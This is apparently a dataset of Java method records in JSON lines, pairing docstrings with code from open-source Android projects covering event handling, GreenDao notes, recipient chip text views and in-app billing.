{"docstring": "//\u5728\u4e3b\u7ebf\u7a0b\n", "func_signal": "public void onUseThread(SimpleEvent event)", "code": "{\n\n        String msg = \"onUseThread\u6536\u5230\u4e86\u6d88\u606f\uff1a\" + event.getMsg();\n        Log.d(TAG, msg);\n        tvDisplay.setText(msg);\n        Toast.makeText(this, msg, Toast.LENGTH_LONG).show();\n    }", "path": "Android-Rapid-Development-Of-Library\\app\\src\\main\\java\\com\\lidong\\demo\\eventbus\\EventBusDemo1Activity.java", "repo_name": "lidong1665/AndroidRapidLibrary", "stars": 578, "license": "None", "language": "java", "size": 38467}
{"docstring": "/**\n * \u6dfb\u52a0\u65e5\u5fd7\n */\n", "func_signal": "private void addNote()", "code": "{\n    String noteText = etAdd.getText().toString();\n    etAdd.setText(\"\");\n\n    final DateFormat df = DateFormat.getDateTimeInstance(DateFormat.MEDIUM, DateFormat.MEDIUM);\n    String comment = \"Added on \" + df.format(new Date());\n    Note note = new Note(null, noteText, comment, new Date());\n    noteDao.insert(note);\n    Log.d(\"DaoExample\", \"Inserted new note, ID: \" + note.getId());\n\n    cursor.requery();\n}", "path": "Android-Rapid-Development-Of-Library\\app\\src\\main\\java\\com\\lidong\\demo\\greendao\\GreenDaoActivity.java", "repo_name": "lidong1665/AndroidRapidLibrary", "stars": 578, "license": "None", "language": "java", "size": 38467}
{"docstring": "/**\n * \u5220\u9664Note\n * @param id\n */\n", "func_signal": "private void deleteNote(long id)", "code": "{\n    noteDao.deleteByKey(id);\n    cursor.requery();\n}", "path": "Android-Rapid-Development-Of-Library\\app\\src\\main\\java\\com\\lidong\\demo\\greendao\\GreenDaoActivity.java", "repo_name": "lidong1665/AndroidRapidLibrary", "stars": 578, "license": "None", "language": "java", "size": 38467}
{"docstring": "/**\n * @param str\n * @param scale\n * @param gapBetweenLetter\n * @return ArrayList of float[] {x1, y1, x2, y2}\n */\n", "func_signal": "public static ArrayList<float[]> getPath(String str, float scale, int gapBetweenLetter)", "code": "{\n    ArrayList<float[]> list = new ArrayList<float[]>();\n    float offsetForWidth = 0;\n    for (int i = 0; i < str.length(); i++) {\n        int pos = str.charAt(i);\n        int key = sPointList.indexOfKey(pos);\n        if (key == -1) {\n            continue;\n        }\n        float[] points = sPointList.get(pos);\n        int pointCount = points.length / 4;\n\n        for (int j = 0; j < pointCount; j++) {\n            float[] line = new float[4];\n            for (int k = 0; k < 4; k++) {\n                float l = points[j * 4 + k];\n                // x\n                if (k % 2 == 0) {\n                    line[k] = (l + offsetForWidth) * scale;\n                }\n                // y\n                else {\n                    line[k] = l * scale;\n                }\n            }\n            list.add(line);\n        }\n        offsetForWidth += 57 + gapBetweenLetter;\n    }\n    return list;\n}", "path": "Android-Rapid-Development-Of-Library\\android_library\\src\\main\\java\\com\\lidong\\android_ibrary\\PullToRefresh\\header\\StoreHousePath.java", "repo_name": "lidong1665/AndroidRapidLibrary", "stars": 578, "license": "None", "language": "java", "size": 38467}
{"docstring": "/**\n *\n * @return\n */\n", "func_signal": "private String randomText()", "code": "{\n    Random random = new Random();\n    Set<Integer> set = new HashSet<Integer>();\n    while (set.size() < 4)\n    {\n        int randomInt = random.nextInt(10);\n        set.add(randomInt);\n    }\n    StringBuffer sb = new StringBuffer();\n    for (Integer i : set)\n    {\n        sb.append(\"\" + i);\n    }\n\n    return sb.toString();\n}", "path": "Android-Rapid-Development-Of-Library\\android_library\\src\\main\\java\\com\\lidong\\android_ibrary\\view\\CustomerView.java", "repo_name": "lidong1665/AndroidRapidLibrary", "stars": 578, "license": "None", "language": "java", "size": 38467}
{"docstring": "/**\n * When the content view has reached top and refresh has been completed, view will be reset.\n *\n * @param frame\n */\n", "func_signal": "@Override\npublic void onUIReset(PtrFrameLayout frame)", "code": "{\n    mScale = 1f;\n    mDrawable.stop();\n}", "path": "Android-Rapid-Development-Of-Library\\android_library\\src\\main\\java\\com\\lidong\\android_ibrary\\PullToRefresh\\header\\MaterialHeader.java", "repo_name": "lidong1665/AndroidRapidLibrary", "stars": 578, "license": "None", "language": "java", "size": 38467}
{"docstring": "/**\n * \u521b\u5efa\u65b0\u5b9e\u4f8b\n *\n * @param index\n * @return\n */\n", "func_signal": "public static CustomListFragment newInstance(int index,String url1)", "code": "{\n    Bundle bundle = new Bundle();\n    bundle.putInt(FRAGMENT_INDEX, index);\n    bundle.putString(\"URL\", url1);\n    CustomListFragment fragment = new CustomListFragment();\n    fragment.setArguments(bundle);\n    return fragment;\n}", "path": "Android-Rapid-Development-Of-Library\\app\\src\\main\\java\\com\\lidong\\demo\\tablayout\\CustomListFragment.java", "repo_name": "lidong1665/AndroidRapidLibrary", "stars": 578, "license": "None", "language": "java", "size": 38467}
{"docstring": "/**\n * If at the top and not in loading, reset\n */\n", "func_signal": "private boolean tryToNotifyReset()", "code": "{\n    if ((mStatus == PTR_STATUS_COMPLETE || mStatus == PTR_STATUS_PREPARE) && mPtrIndicator.isInStartPosition()) {\n        if (mPtrUIHandlerHolder.hasHandler()) {\n            mPtrUIHandlerHolder.onUIReset(this);\n            if (DEBUG) {\n                PtrCLog.i(LOG_TAG, \"PtrUIHandler: onUIReset\");\n            }\n        }\n        mStatus = PTR_STATUS_INIT;\n        clearFlag();\n        return true;\n    }\n    return false;\n}", "path": "Android-Rapid-Development-Of-Library\\android_library\\src\\main\\java\\com\\lidong\\android_ibrary\\PullToRefresh\\PtrFrameLayout.java", "repo_name": "lidong1665/AndroidRapidLibrary", "stars": 578, "license": "None", "language": "java", "size": 38467}
{"docstring": "/**\n * Calculate the bottom of the line the chip will be located on using:\n * 1) which line the chip appears on\n * 2) the height of a chip\n * 3) padding built into the edit text view\n */\n", "func_signal": "private int calculateOffsetFromBottom(int line)", "code": "{\n    // Line offsets start at zero.\n    int actualLine = getLineCount() - (line + 1);\n    return -((actualLine * ((int) mChipHeight) + getPaddingBottom()) + getPaddingTop())\n            + getDropDownVerticalOffset();\n}", "path": "library\\src\\main\\java\\com\\android\\ex\\chips\\RecipientEditTextView.java", "repo_name": "klinker41/android-chips", "stars": 628, "license": "None", "language": "java", "size": 435}
{"docstring": "/**\n * Handle click events for a chip. When a selected chip receives a click\n * event, see if that event was in the delete icon. If so, delete it.\n * Otherwise, unselect the chip.\n */\n", "func_signal": "public void onClick(DrawableRecipientChip chip, int offset, float x, float y)", "code": "{\n    if (chip.isSelected()) {\n        if (isInDelete(chip, offset, x, y)) {\n            removeChip(chip);\n        } else {\n            clearSelectedChip();\n        }\n    }\n}", "path": "library\\src\\main\\java\\com\\android\\ex\\chips\\RecipientEditTextView.java", "repo_name": "klinker41/android-chips", "stars": 628, "license": "None", "language": "java", "size": 435}
{"docstring": "/**\n * Creates a bitmap of the given contact on a selected chip.\n *\n * @param contact The recipient entry to pull data from.\n * @param paint The paint to use to draw the bitmap.\n */\n", "func_signal": "private Bitmap createSelectedChip(RecipientEntry contact, TextPaint paint)", "code": "{\n    paint.setColor(sSelectedTextColor);\n    Bitmap photo;\n    if (mDisableDelete) {\n        // Show the avatar instead if we don't want to delete\n        photo = getAvatarIcon(contact);\n    } else {\n        photo = ((BitmapDrawable) mChipDelete).getBitmap();\n    }\n    return createChipBitmap(contact, paint, photo, mChipBackgroundPressed);\n}", "path": "library\\src\\main\\java\\com\\android\\ex\\chips\\RecipientEditTextView.java", "repo_name": "klinker41/android-chips", "stars": 628, "license": "None", "language": "java", "size": 435}
{"docstring": "/**\n * Convenience method: Append the specified text slice to the TextView's\n * display buffer, upgrading it to BufferType.EDITABLE if it was\n * not already editable. Commas are excluded as they are added automatically\n * by the view.\n */\n", "func_signal": "@Override\npublic void append(CharSequence text, int start, int end)", "code": "{\n    // We don't care about watching text changes while appending.\n    if (mTextWatcher != null) {\n        removeTextChangedListener(mTextWatcher);\n    }\n    super.append(text, start, end);\n    if (!TextUtils.isEmpty(text) && TextUtils.getTrimmedLength(text) > 0) {\n        String displayString = text.toString();\n\n        if (!displayString.trim().endsWith(String.valueOf(COMMIT_CHAR_COMMA))) {\n            // We have no separator, so we should add it\n            super.append(SEPARATOR, 0, SEPARATOR.length());\n            displayString += SEPARATOR;\n        }\n\n        if (!TextUtils.isEmpty(displayString)\n                && TextUtils.getTrimmedLength(displayString) > 0) {\n            mPendingChipsCount++;\n            mPendingChips.add(displayString);\n        }\n    }\n    // Put a message on the queue to make sure we ALWAYS handle pending\n    // chips.\n    if (mPendingChipsCount > 0) {\n        postHandlePendingChips();\n    }\n    mHandler.post(mAddTextWatcher);\n}", "path": "library\\src\\main\\java\\com\\android\\ex\\chips\\RecipientEditTextView.java", "repo_name": "klinker41/android-chips", "stars": 628, "license": "None", "language": "java", "size": 435}
{"docstring": "/**\n * Draws the icon onto the canvas given the source rectangle of the bitmap and the destination\n * rectangle of the canvas.\n */\n", "func_signal": "protected void drawIconOnCanvas(Bitmap icon, Canvas canvas, Paint paint, RectF src, RectF dst)", "code": "{\n    Matrix matrix = new Matrix();\n    matrix.setRectToRect(src, dst, Matrix.ScaleToFit.FILL);\n    canvas.drawBitmap(icon, matrix, paint);\n}", "path": "library\\src\\main\\java\\com\\android\\ex\\chips\\RecipientEditTextView.java", "repo_name": "klinker41/android-chips", "stars": 628, "license": "None", "language": "java", "size": 435}
{"docstring": "/**\n * Monitor key presses in this view to see if the user types\n * any commit keys, which consist of ENTER, TAB, or DPAD_CENTER.\n * If the user has entered text that has contact matches and types\n * a commit key, create a chip from the topmost matching contact.\n * If the user has entered text that has no contact matches and types\n * a commit key, then create a chip from the text they have entered.\n */\n", "func_signal": "@Override\npublic boolean onKeyUp(int keyCode, KeyEvent event)", "code": "{\n    switch (keyCode) {\n        case KeyEvent.KEYCODE_TAB:\n            if (event.hasNoModifiers()) {\n                if (mSelectedChip != null) {\n                    clearSelectedChip();\n                } else {\n                    commitDefault();\n                }\n            }\n            break;\n    }\n    return super.onKeyUp(keyCode, event);\n}", "path": "library\\src\\main\\java\\com\\android\\ex\\chips\\RecipientEditTextView.java", "repo_name": "klinker41/android-chips", "stars": 628, "license": "None", "language": "java", "size": 435}
{"docstring": "/**\n * Returns the avatar icon to use for this recipient entry. Returns null if we don't want to\n * draw an icon for this recipient.\n */\n", "func_signal": "private Bitmap getAvatarIcon(RecipientEntry contact)", "code": "{\n    // Don't draw photos for recipients that have been typed in OR generated on the fly.\n    long contactId = contact.getContactId();\n\n    byte[] photoBytes = contact.getPhotoBytes();\n    // There may not be a photo yet if anything but the first contact address\n    // was selected.\n    if (photoBytes == null && contact.getPhotoThumbnailUri() != null) {\n        // TODO: cache this in the recipient entry?\n        getAdapter().fetchPhoto(contact, contact.getPhotoThumbnailUri(), getContext().getContentResolver());\n        photoBytes = contact.getPhotoBytes();\n    }\n    if (photoBytes != null) {\n        return BitmapFactory.decodeByteArray(photoBytes, 0, photoBytes.length);\n    } else {\n        // TODO: can the scaled down default photo be cached?\n        return ContactImageCreator.getLetterPicture(getContext(), contact);\n    }\n}", "path": "library\\src\\main\\java\\com\\android\\ex\\chips\\RecipientEditTextView.java", "repo_name": "klinker41/android-chips", "stars": 628, "license": "None", "language": "java", "size": 435}
{"docstring": "/**\n * Return whether a touch event was inside the delete target of\n * a selected chip. It is in the delete target if:\n * 1) the x and y points of the event are within the\n * delete assset.\n * 2) the point tapped would have caused a cursor to appear\n * right after the selected chip.\n * @return boolean\n */\n", "func_signal": "private boolean isInDelete(DrawableRecipientChip chip, int offset, float x, float y)", "code": "{\n    // Figure out the bounds of this chip and whether or not\n    // the user clicked in the X portion.\n    // TODO: Should x and y be used, or removed?\n    if (mDisableDelete) {\n        return false;\n    }\n\n    return chip.isSelected() &&\n            ((mAvatarPosition == AVATAR_POSITION_END && offset == getChipEnd(chip)) ||\n            (mAvatarPosition != AVATAR_POSITION_END && offset == getChipStart(chip)));\n}", "path": "library\\src\\main\\java\\com\\android\\ex\\chips\\RecipientEditTextView.java", "repo_name": "klinker41/android-chips", "stars": 628, "license": "None", "language": "java", "size": 435}
{"docstring": "// The following methods are used to provide some functionality on older versions of Android\n// These methods were copied out of JB MR2's TextView\n/////////////////////////////////////////////////\n", "func_signal": "private int supportGetOffsetForPosition(float x, float y)", "code": "{\n    if (getLayout() == null) return -1;\n    final int line = supportGetLineAtCoordinate(y);\n    final int offset = supportGetOffsetAtCoordinate(line, x);\n    return offset;\n}", "path": "library\\src\\main\\java\\com\\android\\ex\\chips\\RecipientEditTextView.java", "repo_name": "klinker41/android-chips", "stars": 628, "license": "None", "language": "java", "size": 435}
{"docstring": "// TODO: This algorithm will need a lot of tweaking after more people have used\n// the chips ui. This attempts to be \"forgiving\" to fat finger touches by favoring\n// what comes before the finger.\n", "func_signal": "private int putOffsetInRange(int o)", "code": "{\n    int offset = o;\n    Editable text = getText();\n    int length = text.length();\n    // Remove whitespace from end to find \"real end\"\n    int realLength = length;\n    for (int i = length - 1; i >= 0; i--) {\n        if (text.charAt(i) == ' ') {\n            realLength--;\n        } else {\n            break;\n        }\n    }\n\n    // If the offset is beyond or at the end of the text,\n    // leave it alone.\n    if (offset >= realLength) {\n        return offset;\n    }\n    Editable editable = getText();\n    while (offset >= 0 && findText(editable, offset) == -1 && findChip(offset) == null) {\n        // Keep walking backward!\n        offset--;\n    }\n    return offset;\n}", "path": "library\\src\\main\\java\\com\\android\\ex\\chips\\RecipientEditTextView.java", "repo_name": "klinker41/android-chips", "stars": 628, "license": "None", "language": "java", "size": 435}
{"docstring": "/**\n * Starts drag-and-drop for the selected chip.\n */\n", "func_signal": "private void startDrag(DrawableRecipientChip currentChip)", "code": "{\n    String address = currentChip.getEntry().getDestination();\n    ClipData data = ClipData.newPlainText(address, address + COMMIT_CHAR_COMMA);\n\n    // Start drag mode.\n    startDrag(data, new RecipientChipShadow(currentChip), null, 0);\n\n    // Remove the current chip, so drag-and-drop will result in a move.\n    // TODO (phamm): consider readd this chip if it's dropped outside a target.\n    removeChip(currentChip);\n}", "path": "library\\src\\main\\java\\com\\android\\ex\\chips\\RecipientEditTextView.java", "repo_name": "klinker41/android-chips", "stars": 628, "license": "None", "language": "java", "size": 435}
{"docstring": "/**\n * Replace the more chip, if it exists, with all of the recipient chips it had\n * replaced when the RecipientEditTextView gains focus.\n */\n", "func_signal": "public void removeMoreChip()", "code": "{\n    if (mMoreChip != null) {\n        Spannable span = getSpannable();\n        span.removeSpan(mMoreChip);\n        mMoreChip = null;\n        // Re-add the spans that were removed.\n        if (mRemovedSpans != null && mRemovedSpans.size() > 0) {\n            // Recreate each removed span.\n            DrawableRecipientChip[] recipients = getSortedRecipients();\n            // Start the search for tokens after the last currently visible\n            // chip.\n            if (recipients == null || recipients.length == 0) {\n                return;\n            }\n            int end = span.getSpanEnd(recipients[recipients.length - 1]);\n            Editable editable = getText();\n            for (DrawableRecipientChip chip : mRemovedSpans) {\n                int chipStart;\n                int chipEnd;\n                String token;\n                // Need to find the location of the chip, again.\n                token = (String) chip.getOriginalText();\n                // As we find the matching recipient for the remove spans,\n                // reduce the size of the string we need to search.\n                // That way, if there are duplicates, we always find the correct\n                // recipient.\n                chipStart = editable.toString().indexOf(token, end);\n                end = chipEnd = Math.min(editable.length(), chipStart + token.length());\n                // Only set the span if we found a matching token.\n                if (chipStart != -1) {\n                    editable.setSpan(chip, chipStart, chipEnd,\n                            Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);\n                }\n            }\n            mRemovedSpans.clear();\n        }\n    }\n}", "path": "library\\src\\main\\java\\com\\android\\ex\\chips\\RecipientEditTextView.java", "repo_name": "klinker41/android-chips", "stars": 628, "license": "None", "language": "java", "size": 435}
{"docstring": "/**\n * When an item in the suggestions list has been clicked, create a chip from the\n * contact information of the selected item.\n */\n", "func_signal": "@Override\npublic void onItemClick(AdapterView<?> parent, View view, int position, long id)", "code": "{\n    if (position < 0) {\n        return;\n    }\n    submitItemAtPosition(position);\n\n    if (itemSelectedListener != null) {\n        itemSelectedListener.onItemSelected();\n    }\n}", "path": "library\\src\\main\\java\\com\\android\\ex\\chips\\RecipientEditTextView.java", "repo_name": "klinker41/android-chips", "stars": 628, "license": "None", "language": "java", "size": 435}
{"docstring": "/**\n * If there is a selected chip, delegate the key events\n * to the selected chip.\n */\n", "func_signal": "@Override\npublic boolean onKeyDown(int keyCode, KeyEvent event)", "code": "{\n    if (mSelectedChip != null && keyCode == KeyEvent.KEYCODE_DEL) {\n        if (mAlternatesPopup != null && mAlternatesPopup.isShowing()) {\n            mAlternatesPopup.dismiss();\n        }\n        removeChip(mSelectedChip);\n    }\n\n    switch (keyCode) {\n        case KeyEvent.KEYCODE_ENTER:\n        case KeyEvent.KEYCODE_DPAD_CENTER:\n            if (event.hasNoModifiers()) {\n                if (commitDefault()) {\n                    return true;\n                }\n                if (mSelectedChip != null) {\n                    clearSelectedChip();\n                    return true;\n                } else if (focusNext()) {\n                    return true;\n                }\n            }\n            break;\n    }\n\n    return super.onKeyDown(keyCode, event);\n}", "path": "library\\src\\main\\java\\com\\android\\ex\\chips\\RecipientEditTextView.java", "repo_name": "klinker41/android-chips", "stars": 628, "license": "None", "language": "java", "size": 435}
{"docstring": "/**\n * Handles pasting a {@link ClipData} to this {@link RecipientEditTextView}.\n */\n", "func_signal": "private void handlePasteClip(ClipData clip)", "code": "{\n    removeTextChangedListener(mTextWatcher);\n\n    if (clip != null && (clip.getDescription().hasMimeType(ClipDescription.MIMETYPE_TEXT_PLAIN) ||\n            clip.getDescription().hasMimeType(ClipDescription.MIMETYPE_TEXT_HTML))){\n        for (int i = 0; i < clip.getItemCount(); i++) {\n            CharSequence paste = clip.getItemAt(i).getText();\n            if (paste != null) {\n                int start = getSelectionStart();\n                int end = getSelectionEnd();\n                Editable editable = getText();\n                if (start >= 0 && end >= 0 && start != end) {\n                    editable.replace(start, end, paste);\n                } else {\n                    editable.insert(end, paste);\n                }\n                handlePasteAndReplace();\n            }\n        }\n    }\n\n    mHandler.post(mAddTextWatcher);\n}", "path": "library\\src\\main\\java\\com\\android\\ex\\chips\\RecipientEditTextView.java", "repo_name": "klinker41/android-chips", "stars": 628, "license": "None", "language": "java", "size": 435}
{"docstring": "/**\n * Dismiss any selected chips when the back key is pressed.\n */\n", "func_signal": "@Override\npublic boolean onKeyPreIme(int keyCode, KeyEvent event)", "code": "{\n    if (keyCode == KeyEvent.KEYCODE_BACK && mSelectedChip != null) {\n        clearSelectedChip();\n        return true;\n    }\n    return super.onKeyPreIme(keyCode, event);\n}", "path": "library\\src\\main\\java\\com\\android\\ex\\chips\\RecipientEditTextView.java", "repo_name": "klinker41/android-chips", "stars": 628, "license": "None", "language": "java", "size": 435}
{"docstring": "/**\n * Monitor touch events in the RecipientEditTextView.\n * If the view does not have focus, any tap on the view\n * will just focus the view. If the view has focus, determine\n * if the touch target is a recipient chip. If it is and the chip\n * is not selected, select it and clear any other selected chips.\n * If it isn't, then select that chip.\n */\n", "func_signal": "@Override\npublic boolean onTouchEvent(MotionEvent event)", "code": "{\n    if (!isFocused()) {\n        // Ignore any chip taps until this view is focused.\n        return super.onTouchEvent(event);\n    }\n    boolean handled = super.onTouchEvent(event);\n    int action = event.getAction();\n    boolean chipWasSelected = false;\n    mGestureDetector.onTouchEvent(event);\n    if (mCopyAddress == null && action == MotionEvent.ACTION_UP) {\n        float x = event.getX();\n        float y = event.getY();\n        int offset = putOffsetInRange(x, y);\n        DrawableRecipientChip currentChip = findChip(offset);\n        if (currentChip != null) {\n            if (action == MotionEvent.ACTION_UP) {\n                if (mSelectedChip != null && mSelectedChip != currentChip) {\n                    clearSelectedChip();\n                    mSelectedChip = selectChip(currentChip);\n                } else if (mSelectedChip == null) {\n                    setSelection(getText().length());\n                    commitDefault();\n                    mSelectedChip = selectChip(currentChip);\n                } else {\n                    onClick(mSelectedChip, offset, x, y);\n                }\n            }\n            chipWasSelected = true;\n            handled = true;\n        } else if (mSelectedChip != null && shouldShowEditableText(mSelectedChip)) {\n            chipWasSelected = true;\n        }\n    }\n    if (action == MotionEvent.ACTION_UP && !chipWasSelected) {\n        clearSelectedChip();\n    }\n    return handled;\n}", "path": "library\\src\\main\\java\\com\\android\\ex\\chips\\RecipientEditTextView.java", "repo_name": "klinker41/android-chips", "stars": 628, "license": "None", "language": "java", "size": 435}
{"docstring": "/**\n * Remove selection from this chip. Unselecting a RecipientChip will render\n * the chip without a delete icon and with an unfocused background. This is\n * called when the RecipientChip no longer has focus.\n */\n", "func_signal": "private void unselectChip(DrawableRecipientChip chip)", "code": "{\n    int start = getChipStart(chip);\n    int end = getChipEnd(chip);\n    Editable editable = getText();\n    mSelectedChip = null;\n    if (start == -1 || end == -1) {\n        Log.w(TAG, \"The chip doesn't exist or may be a chip a user was editing\");\n        setSelection(editable.length());\n        commitDefault();\n    } else {\n        getSpannable().removeSpan(chip);\n        QwertyKeyListener.markAsReplaced(editable, start, end, \"\");\n        editable.removeSpan(chip);\n        try {\n            if (!mNoChips) {\n                editable.setSpan(constructChipSpan(chip.getEntry(), false, false),\n                        start, end, Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);\n            }\n        } catch (NullPointerException e) {\n            Log.e(TAG, e.getMessage(), e);\n        }\n    }\n    setCursorVisible(true);\n    setSelection(editable.length());\n    if (mAlternatesPopup != null && mAlternatesPopup.isShowing()) {\n        mAlternatesPopup.dismiss();\n    }\n}", "path": "library\\src\\main\\java\\com\\android\\ex\\chips\\RecipientEditTextView.java", "repo_name": "klinker41/android-chips", "stars": 628, "license": "None", "language": "java", "size": 435}
{"docstring": "/**\n * Creates a bitmap of the given contact on a selected chip.\n *\n * @param contact The recipient entry to pull data from.\n * @param paint The paint to use to draw the bitmap.\n */\n// TODO: Is leaveBlankIconSpacer obsolete now that we have left and right attributes?\n", "func_signal": "private Bitmap createUnselectedChip(RecipientEntry contact, TextPaint paint,\n        boolean leaveBlankIconSpacer)", "code": "{\n    Drawable background = getChipBackground(contact);\n    Bitmap photo = getAvatarIcon(contact);\n    paint.setColor(getContext().getResources().getColor(android.R.color.black));\n    return createChipBitmap(contact, paint, photo, background);\n}", "path": "library\\src\\main\\java\\com\\android\\ex\\chips\\RecipientEditTextView.java", "repo_name": "klinker41/android-chips", "stars": 628, "license": "None", "language": "java", "size": 435}
{"docstring": "/**\n * Instead of filtering on the entire contents of the edit box,\n * this subclass method filters on the range from\n * {@link Tokenizer#findTokenStart} to {@link #getSelectionEnd}\n * if the length of that range meets or exceeds {@link #getThreshold}\n * and makes sure that the range is not already a Chip.\n */\n", "func_signal": "@Override\nprotected void performFiltering(CharSequence text, int keyCode)", "code": "{\n    if (TextUtils.isEmpty(text)) {\n        getFilter().filter(\"\", this);\n        return;\n    }\n    boolean isCompletedToken = isCompletedToken(text);\n    if (enoughToFilter() && !isCompletedToken) {\n        int end = getSelectionEnd();\n        int start = mTokenizer.findTokenStart(text, end);\n        // If this is a RecipientChip, don't filter\n        // on its contents.\n        Spannable span = getSpannable();\n        DrawableRecipientChip[] chips = span.getSpans(start, end, DrawableRecipientChip.class);\n        if (chips != null && chips.length > 0) {\n            dismissDropDown();\n            return;\n        }\n    } else if (isCompletedToken) {\n        dismissDropDown();\n        return;\n    }\n    super.performFiltering(text, keyCode);\n}", "path": "library\\src\\main\\java\\com\\android\\ex\\chips\\RecipientEditTextView.java", "repo_name": "klinker41/android-chips", "stars": 628, "license": "None", "language": "java", "size": 435}
{"docstring": "/**\n * Requests purchase information for the specified notification. Immediately\n * followed by a call to\n * {@link #onPurchaseInformationResponse(long, boolean)} and later to\n * {@link #onPurchaseStateChanged(Context, String, String)}, if the request\n * is successful.\n * \n * @param context\n * @param notifyId\n *            id of the notification whose purchase information is\n *            requested.\n */\n", "func_signal": "private static void getPurchaseInformation(Context context, String notifyId)", "code": "{\n\tfinal long nonce = Security.generateNonce();\n\tBillingService.getPurchaseInformation(context, new String[] { notifyId }, nonce);\n}", "path": "AndroidBillingLibrary\\src\\net\\robotmedia\\billing\\BillingController.java", "repo_name": "robotmedia/AndroidBillingLibrary", "stars": 533, "license": "None", "language": "java", "size": 756}
{"docstring": "/**\n * Notifies observers of the purchase state change of the specified item.\n * \n * @param itemId\n *            id of the item whose purchase state has changed.\n * @param state\n *            new purchase state of the item.\n */\n", "func_signal": "private static void notifyPurchaseStateChange(String itemId, Transaction.PurchaseState state)", "code": "{\n\tfor (IBillingObserver o : observers) {\n\t\to.onPurchaseStateChanged(itemId, state);\n\t}\n}", "path": "AndroidBillingLibrary\\src\\net\\robotmedia\\billing\\BillingController.java", "repo_name": "robotmedia/AndroidBillingLibrary", "stars": 533, "license": "None", "language": "java", "size": 756}
{"docstring": "/**\n * Requests to confirm all pending notifications for the specified item.\n * \n * @param context\n * @param itemId\n *            id of the item whose purchase must be confirmed.\n * @return true if pending notifications for this item were found, false\n *         otherwise.\n */\n", "func_signal": "public static boolean confirmNotifications(Context context, String itemId)", "code": "{\n\tfinal Set<String> notifications = manualConfirmations.get(itemId);\n\tif (notifications != null) {\n\t\tconfirmNotifications(context, notifications.toArray(new String[] {}));\n\t\treturn true;\n\t} else {\n\t\treturn false;\n\t}\n}", "path": "AndroidBillingLibrary\\src\\net\\robotmedia\\billing\\BillingController.java", "repo_name": "robotmedia/AndroidBillingLibrary", "stars": 533, "license": "None", "language": "java", "size": 756}
{"docstring": "/**\n * Called after a {@link net.robotmedia.billing.BillingRequest} is sent.\n * \n * @param context\n * @param requestId\n *            the id of the request.\n * @param responseCode\n *            the response code.\n * @see net.robotmedia.billing.request.ResponseCode\n */\n", "func_signal": "protected static void onResponseCode(Context context, long requestId, int responseCode)", "code": "{\n\tfinal BillingRequest.ResponseCode response = BillingRequest.ResponseCode.valueOf(responseCode);\n\tdebug(\"Request \" + requestId + \" received response \" + response);\n\n\tfinal BillingRequest request = pendingRequests.get(requestId);\n\tif (request != null) {\n\t\tpendingRequests.remove(requestId);\n\t\trequest.onResponseCode(response);\n\t}\n}", "path": "AndroidBillingLibrary\\src\\net\\robotmedia\\billing\\BillingController.java", "repo_name": "robotmedia/AndroidBillingLibrary", "stars": 533, "license": "None", "language": "java", "size": 756}
{"docstring": "/**\n * <p>\n * Requests the purchase of the specified item with optional automatic\n * confirmation.\n * </p>\n * <p>\n * For subscriptions, use\n * {@link #requestSubscription(Context, String, boolean, String)} instead.\n * </p>\n * \n * @param context\n * @param itemId\n *            id of the item to be purchased.\n * @param confirm\n *            if true, the transaction will be confirmed automatically. If\n *            false, the transaction will have to be confirmed with a call\n *            to {@link #confirmNotifications(Context, String)}.\n * @param developerPayload\n *            a developer-specified string that contains supplemental\n *            information about the order.\n * @see IBillingObserver#onPurchaseIntent(String, PendingIntent)\n */\n", "func_signal": "public static void requestPurchase(Context context, String itemId, boolean confirm, String developerPayload)", "code": "{\n\tif (confirm) {\n\t\tautomaticConfirmations.add(itemId);\n\t}\n\tBillingService.requestPurchase(context, itemId, developerPayload);\n}", "path": "AndroidBillingLibrary\\src\\net\\robotmedia\\billing\\BillingController.java", "repo_name": "robotmedia/AndroidBillingLibrary", "stars": 533, "license": "None", "language": "java", "size": 756}
{"docstring": "/**\n * Returns the in-app product billing support status, and checks it\n * asynchronously if it is currently unknown. Observers will receive a\n * {@link IBillingObserver#onBillingChecked(boolean)} notification in either\n * case.\n * <p>\n * In-app product support does not imply subscription support. To check if\n * subscriptions are supported, use\n * {@link BillingController#checkSubscriptionSupported(Context)}.\n * </p>\n * \n * @param context\n * @return the current in-app product billing support status (unknown,\n *         supported or unsupported). If it is unsupported, subscriptions\n *         are also unsupported.\n * @see IBillingObserver#onBillingChecked(boolean)\n * @see BillingController#checkSubscriptionSupported(Context)\n */\n", "func_signal": "public static BillingStatus checkBillingSupported(Context context)", "code": "{\n\tif (billingStatus == BillingStatus.UNKNOWN) {\n\t\tBillingService.checkBillingSupported(context);\n\t} else {\n\t\tboolean supported = billingStatus == BillingStatus.SUPPORTED;\n\t\tonBillingChecked(supported);\n\t}\n\treturn billingStatus;\n}", "path": "AndroidBillingLibrary\\src\\net\\robotmedia\\billing\\BillingController.java", "repo_name": "robotmedia/AndroidBillingLibrary", "stars": 533, "license": "None", "language": "java", "size": 756}
{"docstring": "/**\n * Returns the number of purchases for the specified item. Refunded and\n * cancelled purchases are not subtracted. See\n * {@link #countPurchasesNet(Context, String)} if they need to be.\n * \n * @param context\n * @param itemId\n *            id of the item whose purchases will be counted.\n * @return number of purchases for the specified item.\n */\n", "func_signal": "public static int countPurchases(Context context, String itemId)", "code": "{\n\tfinal byte[] salt = getSalt();\n\titemId = salt != null ? Security.obfuscate(context, salt, itemId) : itemId;\n\treturn TransactionManager.countPurchases(context, itemId);\n}", "path": "AndroidBillingLibrary\\src\\net\\robotmedia\\billing\\BillingController.java", "repo_name": "robotmedia/AndroidBillingLibrary", "stars": 533, "license": "None", "language": "java", "size": 756}
{"docstring": "/**\n * Lists all transactions of the specified item, stored locally.\n * \n * @param context\n * @param itemId\n *            id of the item whose transactions will be returned.\n * @return list of transactions.\n */\n", "func_signal": "public static List<Transaction> getTransactions(Context context, String itemId)", "code": "{\n\tfinal byte[] salt = getSalt();\n\titemId = salt != null ? Security.obfuscate(context, salt, itemId) : itemId;\n\tList<Transaction> transactions = TransactionManager.getTransactions(context, itemId);\n\tunobfuscate(context, transactions);\n\treturn transactions;\n}", "path": "AndroidBillingLibrary\\src\\net\\robotmedia\\billing\\BillingController.java", "repo_name": "robotmedia/AndroidBillingLibrary", "stars": 533, "license": "None", "language": "java", "size": 756}
